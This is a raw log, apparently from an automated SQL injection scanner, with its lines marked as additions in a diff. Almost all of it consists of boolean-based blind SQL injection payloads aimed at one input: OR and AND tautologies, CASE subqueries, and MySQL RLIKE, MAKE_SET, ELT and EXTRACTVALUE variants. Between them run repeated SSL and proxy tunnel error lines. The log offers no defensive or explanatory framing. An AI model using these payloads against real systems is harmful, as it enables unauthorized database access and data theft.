+[08:25:47] [PAYLOAD] -9384'  OR 1311=1311-- -
+[08:25:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[08:25:48] [PAYLOAD] @EMAIL@'  OR NOT 7906=7676-- -
+[08:25:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:48] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:48] [PAYLOAD] @EMAIL@'  OR NOT 3008=3008-- -
+[08:25:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:25:49] [PAYLOAD] @EMAIL@'  AND 8498=(SELECT (CASE WHEN (8498=3710) THEN 8498 ELSE (SELECT 3710 UNION SELECT 3803) END))-- -
+[08:25:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:50] [PAYLOAD] @EMAIL@'  AND 3885=(SELECT (CASE WHEN (3885=3885) THEN 3885 ELSE (SELECT 3613 UNION SELECT 7463) END))-- -
+[08:25:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:25:50] [PAYLOAD] -7385'  OR 7913=(SELECT (CASE WHEN (7913=9768) THEN 7913 ELSE (SELECT 9768 UNION SELECT 9335) END))-- -
+[08:25:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:51] [PAYLOAD] -2909'  OR 6970=(SELECT (CASE WHEN (6970=6970) THEN 6970 ELSE (SELECT 9507 UNION SELECT 7435) END))-- -
+[08:25:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[08:25:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[08:25:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[08:25:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:25:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:25:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[08:25:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[08:25:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[08:25:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[08:25:51] [PAYLOAD] @EMAIL@'  RLIKE (SELECT (CASE WHEN (6200=8132) THEN 0x40454d41494c40 ELSE 0x28 END))-- -
+[08:25:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:52] [PAYLOAD] @EMAIL@'  RLIKE (SELECT (CASE WHEN (7000=7000) THEN 0x40454d41494c40 ELSE 0x28 END))-- -
+[08:25:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:52] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:25:52] [PAYLOAD] @EMAIL@'  AND MAKE_SET(8183=7211,7211)-- -
+[08:25:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:53] [PAYLOAD] @EMAIL@'  AND MAKE_SET(3263=3263,5581)-- -
+[08:25:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:53] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:25:53] [PAYLOAD] -5094'  OR MAKE_SET(3983=2250,2250)-- -
+[08:25:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:54] [PAYLOAD] -2131'  OR MAKE_SET(5742=5742,4244)-- -
+[08:25:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:54] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[08:25:54] [PAYLOAD] @EMAIL@'  AND ELT(7658=6049,6049)-- -
+[08:25:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:55] [PAYLOAD] @EMAIL@'  AND ELT(2889=2889,9954)-- -
+[08:25:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:55] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[08:25:55] [PAYLOAD] -9859'  OR ELT(2438=7403,7403)-- -
+[08:25:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:56] [PAYLOAD] -7485'  OR ELT(7979=7979,5629)-- -
+[08:25:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:57] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:25:57] [PAYLOAD] @EMAIL@'  AND EXTRACTVALUE(4521,CASE WHEN (4521=3262) THEN 4521 ELSE 0x3A END)-- -
+[08:25:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:57] [PAYLOAD] @EMAIL@'  AND EXTRACTVALUE(2713,CASE WHEN (2713=2713) THEN 2713 ELSE 0x3A END)-- -
+[08:25:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:58] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:25:58] [PAYLOAD] -6760'  OR EXTRACTVALUE(6967,CASE WHEN (6967=5827) THEN 6967 ELSE 0x3A END)-- -
+[08:25:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:58] [PAYLOAD] -3859'  OR EXTRACTVALUE(7803,CASE WHEN (7803=7803) THEN 7803 ELSE 0x3A END)-- -
